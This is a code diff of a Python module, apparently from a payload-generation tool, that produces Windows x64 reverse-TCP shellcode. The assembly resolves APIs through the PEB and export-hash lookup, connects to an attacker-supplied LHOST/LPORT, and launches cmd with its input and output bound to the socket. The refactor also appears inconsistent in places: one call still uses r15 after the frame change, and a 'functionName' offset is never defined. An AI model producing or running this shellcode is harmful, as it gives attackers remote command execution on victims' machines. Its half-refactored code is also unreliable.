@@ -1,11 +1,15 @@
-import sys
-import ctypes
-import struct
+from sys import argv
+from struct import pack
+from ctypes import sizeof
+from ctypes import c_uint64 
 
 from sickle.common.lib.reversing.assembler import Assembler
 
-from sickle.common.lib.generic.mparser import argument_check
+from sickle.common.lib.programmer.instantiator import gen_offsets
+from sickle.common.lib.programmer.instantiator import init_sc_args
+from sickle.common.lib.programmer.instantiator import calc_stack_space
 
+from sickle.common.lib.generic.mparser import argument_check
 from sickle.common.lib.generic.convert import port_str_to_htons
 from sickle.common.lib.generic.convert import from_str_to_xwords
 from sickle.common.lib.generic.convert import ip_str_to_inet_addr
@@ -13,21 +17,17 @@ from sickle.common.lib.generic.convert import from_str_to_win_hash
 
 from sickle.common.headers.windows.ntdef import _LIST_ENTRY
 from sickle.common.headers.windows.ntdef import _UNICODE_STRING
-
 from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
 from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS64
 from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
 from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER64
-
 from sickle.common.headers.windows.winternl import _PEB
 from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
 from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY
-
 from sickle.common.headers.windows.winsock2 import AF_INET
 from sickle.common.headers.windows.winsock2 import sockaddr
 from sickle.common.headers.windows.winsock2 import SOCK_STREAM
 from sickle.common.headers.windows.winsock2 import IPPROTO_TCP
-
 from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
 from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES
 
@@ -41,7 +41,7 @@ class Shellcode():
 
     module = f"{platform}/{arch}/shell_reverse_tcp"
 
-    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
+    example_run = f"{argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
 
     ring = 3
 
@@ -79,9 +79,9 @@ class Shellcode():
 
         self.dependencies = {
             "Kernel32.dll": [
+                "LoadLibraryA",
                 "CreateProcessA",
                 "TerminateProcess",
-                "LoadLibraryA",
             ],
             "Ws2_32.dll": [
                 "WSAStartup",
@@ -90,20 +90,18 @@ class Shellcode():
             ],
         }
 
-        self.storage_offsets = {
-            # -------------- FUNCTIONS --------------
-            "CreateProcessA"                : 0x090,
-            "TerminateProcess"              : 0x088,
-            "LoadLibraryA"                  : 0x080,
-            "WSAStartup"                    : 0x098,
-            "WSASocketA"                    : 0x0a0,
-            "connect"                       : 0x0a8,
-            # -------------- VARIABLES --------------
-            "tmpFunctionBuffer"             : 0x100,
-            "wsaData"                       : 0x200, 
-            "name"                          : 0x220,
-            "lpStartInfo"                   : 0x300,
-        }
+        sc_args = init_sc_args(self.dependencies)
+        sc_args.update({
+            "wsaData"                       : 0x00, 
+            "name"                          : 0x00,
+            "lpStartInfo"                   : 0x00,
+        })
+
+        self.stack_space = calc_stack_space(sc_args,
+                                            sizeof(c_uint64))
+
+        self.storage_offsets = gen_offsets(sc_args,
+                                           Shellcode.arch)
 
         return
 
@@ -112,25 +110,9 @@ class Shellcode():
         """
 
         stub = f"""
-; DWORD64 getKernel32()
-; {{
-;	 CHAR c = 'K';
-;	 PPEB pPEB = (PPEB)__readgsqword(0x60);
-;	 PPEB_LDR_DATA pLdrData = (PLDR_DATA_TABLE_ENTRY)pPEB->Ldr;
-;	 DWORD64 pHeadEntry = ((DWORD64)((PLDR_DATA_TABLE_ENTRY)pPEB->Ldr->InInitializationOrderModuleList.Flink));
-;
-;	 PLIST_ENTRY pEntry = ((PLIST_ENTRY)pHeadEntry)->Flink;
-;	 while (1) {{
-;		 PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)((DWORD64)pEntry - 0x10);
-;		 if (((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[0]) == c) && ((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[13]) == '\0')) {{
-;			 return pLdrDataTableEntry->InInitializationOrderLinks.Flink;
-;		 }}
-;
-;		 pEntry = pEntry->Flink;
-;	 }}
-; }}
-
 getKernel32:
+    push rbp
+    mov rbp, rsp
     mov dl, 0x4b
 getPEB:
     mov rcx, 0x60
@@ -147,6 +129,8 @@ search:
     jne search
     cmp [rsi], dl
     jne search
+found:
+    leave
     ret
         """
 
@@ -157,40 +141,9 @@ search:
         """
 
         stub = f"""
-; UINT hashAlgorithm(char* functionName)
-; {{
-;	 DWORD hash = 0x00;
-;	 DWORD rorByte = 0x0D;
-;	 for (int i = 0; i < (strlen(functionName)); i++)
-;	 {{
-;		 hash += (UINT16)functionName[i] & 0xFFFFFFFF;
-;		 if (i < (strlen(functionName) - 1)) {{
-;			 hash = ((hash >> rorByte) | (hash << (32 - rorByte))) & 0xFFFFFFFF;
-;		 }}
-;	 }}
-;	 return hash;
-; }}
-;
-; void lookupFunction(LPVOID moduleBase, UINT functionHash) {{
-;	 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
-;	 PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
-;	 IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
-;	 DWORD* addressOfNames = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNames);
-;	 DWORD numberOfNames = exportDirectory->NumberOfNames;
-;
-;	 DWORD i = numberOfNames;
-;	 while (i-- != 0) {{
-;		 char* functionNameFromModule = (char*)((BYTE*)moduleBase + addressOfNames[i]);
-;		 if (hashAlgorithm(functionNameFromModule) == functionHash) {{
-;			 DWORD* addressOfFunctions = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfFunctions);
-;			 DWORD* addressOfNameOrdinals = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals);
-;			 WORD ordinal = ((WORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals))[i];
-;			 return (LPVOID)((BYTE*)moduleBase + addressOfFunctions[ordinal]);
-;		 }}
-;	 }}
-; }}
-
 lookupFunction:
+    push rbp
+    mov rbp, rsp
     mov ebx, [rdi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
     add rbx, {_IMAGE_NT_HEADERS64.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
     add rbx, rdi
@@ -229,9 +182,8 @@ findAddress:
     add r8, rdi
     mov eax, [r8 + rax * 4]
     add rax, rdi
-found:
-
 error:
+    leave
     ret
         """
 
@@ -242,32 +194,35 @@ error:
         """
 
         lists = from_str_to_xwords(lib)
-        write_index = self.storage_offsets['tmpFunctionBuffer']
+        write_index = self.storage_offsets['functionName']
 
         src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
+
         for i in range(len(lists["QWORD_LIST"])):
-            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
-            src += "    mov [r15+{}], rcx\n".format(hex(write_index))
-            write_index += 8
+            src += "    mov rcx, 0x{}\n".format( pack('<Q', lists["QWORD_LIST"][i]).hex() )
+            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
+            write_index -= 8
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
-            src += "    mov [r15+{}], ecx\n".format(hex(write_index))
-            write_index += 4
+            src += "    mov ecx, dword 0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() ) 
+            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
+            write_index -= 4
 
         for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
-            src += "    mov [r15+{}], cx\n".format(hex(write_index))
-            write_index += 2
+            src += "    mov cx, 0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
+            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
+            write_index -= 2
 
         for i in range(len(lists["BYTE_LIST"])):
             src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
-            src += "    mov [r15+{}], cl\n".format(hex(write_index))
-            write_index += 1
+            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
+            write_index -= 1
 
         src += f"""
-    lea rcx, [r15 + {self.storage_offsets['tmpFunctionBuffer']}]
-    mov rax, [r15 + {self.storage_offsets['LoadLibraryA']}]
+    xor rcx, rcx
+    mov [rbp-{write_index}], cl
+    lea rcx, [rbp - {self.storage_offsets['functionName']}]
+    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
     call rax
         """
 
@@ -290,7 +245,7 @@ error:
 get_{imports[func]}:
     mov rdx, {from_str_to_win_hash(imports[func])}
     call lookupFunction
-    mov [r15 + {self.storage_offsets[imports[func]]}], rax
+    mov [rbp - {self.storage_offsets[imports[func]]}], rax
                 """
 
         return stub
@@ -309,14 +264,14 @@ get_{imports[func]}:
             lport = int(argv_dict["LPORT"])
 
 
-        shellcode = """
+        shellcode = f"""
 _start:
+    push rbp
+    mov rbp, rsp
+    sub rsp, {self.stack_space}
+
     call getKernel32
     mov rdi, rax
-
-stackAlign:
-    sub rsp, 8
-    mov r15, rsp
 """
 
         shellcode += self.resolve_functions()
@@ -326,8 +281,8 @@ stackAlign:
 ;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
 call_WSAStartup:
     mov rcx, 0x202
-    lea rdx, [r15 + {self.storage_offsets['wsaData']}]
-    mov rax, [r15 + {self.storage_offsets['WSAStartup']}]
+    lea rdx, [rbp - {self.storage_offsets['wsaData']}]
+    mov rax, [rbp - {self.storage_offsets['WSAStartup']}]
     call rax
 
 ; RAX => WSASocketA([in] int                 af,              // RCX      => AF_INET
@@ -343,7 +298,7 @@ call_WSASocketA:
     xor r9, r9
     mov [rsp+0x20], r9
     mov [rsp+0x28], r9
-    mov rax, [r15 + {self.storage_offsets['WSASocketA']}]
+    mov rax, [rbp - {self.storage_offsets['WSASocketA']}]
     call rax
     mov rsi, rax ; save the socket file descriptor (sockfd)
 
@@ -352,18 +307,18 @@ call_WSASocketA:
 ;                [in] int namelen);         // R8  => sizeof(sockaddr)
 call_connect:
     mov rcx, rax
-    mov r8, {ctypes.sizeof(sockaddr)}
-    lea rdx, [r15 + {self.storage_offsets['name']}]
-    mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
+    mov r8, {sizeof(sockaddr)}
+    lea rdx, [rbp - {self.storage_offsets['name']}]
+    mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{pack('<H', lport).hex()}0002
     mov [rdx], r9
     xor r9, r9
     mov [rdx + 0x8], r9
-    mov rax, [r15 + {self.storage_offsets['connect']}]
+    mov rax, [rbp - {self.storage_offsets['connect']}]
     call rax
 
 ; [RBX] => typedef struct _STARTUPINFOA {{ }}
 setup_STARTUPINFOA:
-    mov rdi, r15
+    mov rdi, rbp
     add rdi, {self.storage_offsets['lpStartInfo']}
 
     mov rbx, rdi  ; RDI = Destination ( memset(rdi, value, x) )
@@ -371,7 +326,7 @@ setup_STARTUPINFOA:
     mov ecx, 0x20 ; 0x20 * sizeof(DWORD) = (x -> 0x80)
     rep stosd     ; Zero out x bytes
 
-    mov eax, {ctypes.sizeof(_STARTUPINFOA)} ; lpStartInfo.cb = sizeof(_STARTUPINFO)
+    mov eax, {sizeof(_STARTUPINFOA)} ; lpStartInfo.cb = sizeof(_STARTUPINFO)
     mov [rbx], eax
 
     mov eax, {STARTF_USESTDHANDLES}
@@ -392,7 +347,7 @@ setup_STARTUPINFOA:
 ;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo ()
 call_CreateProccessA:
     xor ecx, ecx                 ; lpApplicationName
-    mov rdx, r15                 ; lpCommandLine
+    mov rdx, rbp                 ; lpCommandLine
     add rdx, 0x180               ;
     mov eax, 0x646d63            ; "cmd"
     mov [rdx], rax
@@ -408,7 +363,7 @@ call_CreateProccessA:
     mov [rsp + 0x40], rbx        ; lpStartupInfo
     add rbx, 0x68
     mov [rsp + 0x48], rbx        ; lpProcessInformation
-    mov rax, [r15 + {self.storage_offsets['CreateProcessA']}]
+    mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
     call rax
 
 ; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
@@ -419,6 +374,10 @@ call_TerminateProcess:
 	xor rdx, rdx
 	mov rax, [r15 + {self.storage_offsets['TerminateProcess']}]
 	call rax
+
+fin:
+    leave
+    ret
 """
 
         shellcode += self.get_kernel32()
